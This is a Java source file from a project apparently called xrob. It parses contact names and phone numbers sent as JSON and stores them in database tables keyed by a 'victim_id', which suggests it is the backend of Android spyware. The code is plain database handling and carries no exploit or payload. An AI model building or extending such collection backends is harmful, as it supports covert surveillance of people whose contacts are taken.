package com.theah64.xrob.api.database.tables;

import com.sun.istack.internal.NotNull;
import com.sun.istack.internal.Nullable;
import com.theah64.xrob.api.database.Connection;
import com.theah64.xrob.api.models.Contact;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by theapache64 on 4/9/16,11:39 AM.
 */
public class Contacts extends BaseTable<Contact> {

    private static final String COLUMN_PHONE_NUMBER = "phone_number";
    private static final String COLUMN_PHONE_TYPE = "phone_type";
    private static final String COLUMN_VICTIM_ID = "victim_id";
    private static final String KEY_PHONE_NUMBERS = "phone_numbers";
    private static final String COLUMN_ANDROID_CONTACT_ID = "android_contact_id";
    private static final String TABLE_NAME_CONTACTS = "contacts";

    private static Contacts instance = new Contacts();

    private Contacts() {
    }

    public static Contacts getInstance() {
        return instance;
    }

    protected boolean isPhoneNumberExist(Contact.PhoneNumber phoneNumber) {

        boolean isExist = false;
        final String query = "SELECT id FROM phone_numbers WHERE contact_id = ? AND phone = ? AND phone_type = ? LIMIT 1";
        final java.sql.Connection con = Connection.getConnection();

        try {
            final PreparedStatement ps = con.prepareStatement(query);

            ps.setString(1, phoneNumber.getContactId());
            ps.setString(2, phoneNumber.getPhone());
            ps.setString(3, phoneNumber.getType());

            final ResultSet rs = ps.executeQuery();
            isExist = rs.first();
            System.out.println("isPhoneNumberExist : " + isExist + ", Contact : " + phoneNumber);
            rs.close();
            ps.close();

        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
        return isExist;
    }

    @Override
    protected List<Contact> parse(@Nullable String victimId, @NotNull JSONArray jaContacts) throws JSONException {

        final List<Contact> contactList = new ArrayList<>();

        for (int i = 0; i < jaContacts.length(); i++) {

            final JSONObject joContact = jaContacts.getJSONObject(i);

            final String androidContactId = joContact.getString(COLUMN_ANDROID_CONTACT_ID);
            final String name = joContact.getString(COLUMN_NAME);

            final JSONArray jaPhoneNumbers = joContact.getJSONArray(KEY_PHONE_NUMBERS);
            final List<Contact.PhoneNumber> phoneNumbers = parsePhoneNumbers(null, jaPhoneNumbers);
            contactList.add(new Contact(victimId, androidContactId, null, name, phoneNumbers));

        }

        return contactList;
    }

    /**
     * Used parse phone numbers and their types from the JSONArray received via JSONPOSTServlet.
     */
    private List<Contact.PhoneNumber> parsePhoneNumbers(final String contactId, JSONArray jaPhoneNumbers) {

        if (jaPhoneNumbers != null) {

            final List<Contact.PhoneNumber> phoneNumbers = new ArrayList<>(jaPhoneNumbers.length());

            try {

                for (int i = 0; i < jaPhoneNumbers.length(); i++) {
                    final JSONObject jaPhoneNumber = jaPhoneNumbers.getJSONObject(i);
                    final String phoneNumber = jaPhoneNumber.getString(COLUMN_PHONE_NUMBER);
                    final String phoneType = jaPhoneNumber.getString(COLUMN_PHONE_TYPE);
                    phoneNumbers.add(new Contact.PhoneNumber(contactId, phoneNumber, phoneType));
                }

                return phoneNumbers;

            } catch (JSONException e) {
                e.printStackTrace();
            }

        }
        return null;
    }

    @Override
    public Contact get(String column1, String value1, String column2, String value2) {
        Contact contact = null;
        final String query = String.format("SELECT id,name FROM contacts WHERE %s = ? AND %s = ? LIMIT 1", column1, column2);
        final java.sql.Connection con = Connection.getConnection();
        try {
            final PreparedStatement ps = con.prepareStatement(query);

            ps.setString(1, value1);
            ps.setString(2, value2);

            final ResultSet rs = ps.executeQuery();

            if (rs.first()) {
                final String id = rs.getString(COLUMN_ID);
                final String name = rs.getString(COLUMN_NAME);
                contact = new Contact(null, null, id, name, null);
            }

            rs.close();
            ps.close();

        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
        return contact;
    }

    /**
     * Adding contacts from JSONArray
     *
     * @param victimId
     * @param jsonArray
     * @throws RuntimeException
     * @throws JSONException
     */
    @Override
    public void addv2(@Nullable String victimId, @NotNull JSONArray jsonArray) throws RuntimeException, JSONException {

        boolean isAdded = true;
        //Preparing list
        final List<Contact> contactList = parse(victimId, jsonArray);

        final String insertContactQuery = "INSERT INTO contacts (victim_id,android_contact_id, name) VALUES (?,?,?);";

        final java.sql.Connection con = Connection.getConnection();

        try {
            final PreparedStatement psAddContact = con.prepareStatement(insertContactQuery, PreparedStatement.RETURN_GENERATED_KEYS);
            psAddContact.setString(1, victimId);

            for (final Contact contact : contactList) {

                String contactId = null;
                final Contact exContact = get(Contacts.COLUMN_VICTIM_ID, victimId, Contacts.COLUMN_ANDROID_CONTACT_ID, contact.getAndroidContactId());

                if (exContact == null) {

                    //Adding new contact
                    psAddContact.setString(2, contact.getAndroidContactId());
                    psAddContact.setString(3, contact.getName());
                    isAdded = isAdded && psAddContact.executeUpdate() == 1;

                    if (isAdded) {
                        final ResultSet genRs = psAddContact.getGeneratedKeys();
                        if (genRs.first()) {
                            contactId = genRs.getString(1);
                        }
                        genRs.close();
                    }

                } else {

                    if (!exContact.getName().equals(contact.getName())) {

                        System.out.println(exContact);

                        //Name changed, so update the contacts table
                        final boolean isUpdated = update(COLUMN_ANDROID_CONTACT_ID, contact.getAndroidContactId(), COLUMN_NAME, contact.getName());

                        if (!isUpdated) {
                            throw new RuntimeException("Failed to edit the contact name");
                        }

                    }

                    contactId = exContact.getId();
                }


                if (contactId != null) {

                    if (contact.getPhone() != null && contact.getPhone().size() > 0) {

                        final String insertPhoneNumberQuery = "INSERT INTO phone_numbers (contact_id, phone,phone_type) VALUES (?,?,?);";
                        final PreparedStatement ps = con.prepareStatement(insertPhoneNumberQuery);

                        //Looping through each phone number and add it to the database.
                        for (final Contact.PhoneNumber phoneNumber : contact.getPhone()) {

                            //Setting phone number's contact id
                            phoneNumber.setContactId(contactId);

                            if (!isPhoneNumberExist(phoneNumber)) {

                                ps.setString(1, phoneNumber.getContactId());
                                ps.setString(2, phoneNumber.getPhone());
                                ps.setString(3, phoneNumber.getType());

                                isAdded = isAdded && ps.executeUpdate() == 1;
                            }

                        }

                        ps.close();

                    }
                }


            }


        } catch (SQLException e) {
            e.printStackTrace();
            isAdded = false;
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }

        if (!isAdded) {
            throw new RuntimeException("Error occured while adding contacts to database");
        }

    }

    @Override
    public boolean update(String whereColumn, String whereColumnValue, String updateColumn, String newUpdateColumnValue) {
        return update(TABLE_NAME_CONTACTS, whereColumn, whereColumnValue, updateColumn, newUpdateColumnValue);
    }
}
